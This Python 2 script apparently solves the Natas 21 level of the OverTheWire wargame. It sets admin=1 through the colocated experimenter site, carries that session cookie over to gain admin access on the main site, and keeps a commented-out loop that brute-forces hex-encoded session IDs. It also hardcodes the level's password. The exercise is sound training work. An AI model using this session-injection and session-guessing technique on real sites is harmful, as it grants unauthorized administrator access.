#!/usr/bin/env python

import requests
import re
import urllib
import base64
from string import *
from time import *

characters = lowercase + uppercase + digits
#print characters

username = 'natas21'
password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'

#headers = { "Referer" : "http://natas5.natas.labs.overthewire.org/"}

#cookies = { "loggedin" : "1"}

url = 'http://%s.natas.labs.overthewire.org/' %username
experimenter = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1'
session = requests.Session()

response = session.post(experimenter, auth = (username, password))  
print response.text
#jv6s7535okifl2kfq2315ra906
old_session = session.cookies["PHPSESSID"]


response = session.get(url, cookies = {"PHPSESSID":old_session}, auth = (username, password) )
print response.text
#print session.cookies["PHPSESSID"]



#for session_id in range (1,641):
#
##response = session.post(url, data = {"username" : "natas20", "password": "blah"}, auth = (username, password))
	#print {"PHPSESSID": str("%d-admin" %session_id).encode("hex")}
	#response = session.get(url, cookies = {"PHPSESSID": str("%d-admin" %session_id).encode("hex")}, auth = (username, password) )
	#content = response.text
##
	#if ( "You are an admin" in content ):
		#print "Got it!", session_id
		##print content
		#break
	
		#print "trying", session_id
	#rint content	
	#print session.cookies["PHPSESSID"].decode('hex')
#print "======================================================="
#print content
